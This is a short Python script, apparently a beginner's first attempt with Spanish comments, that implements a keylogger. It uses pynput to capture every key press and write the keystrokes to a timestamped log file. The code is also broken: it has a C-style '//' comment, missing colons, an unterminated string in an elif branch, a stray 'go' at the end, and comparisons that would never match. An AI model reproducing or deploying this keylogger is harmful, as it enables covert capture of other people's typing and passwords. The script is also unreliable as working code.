//prueba inicial
import datetime
from pynput.keyboard import Listener

d = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')

f = open('keylogger_{}'.format(d),'w')

def key_recorder(key):
    print(key)
    if key == 'Key.enter':
        f.write('\n')
    elif key == 'Key.space':
        f.write(' ')
    elif key =='Key.backspace':
        f.write('%BORRAR%')
    elif key =='<65027>'
        f.write('alt gr')
    elif key =='Key.shift_r'
        f.write('Shift Derecho')
    elif key =='

with Listener(on_press=key_recorder) as l:
    l.join()
go

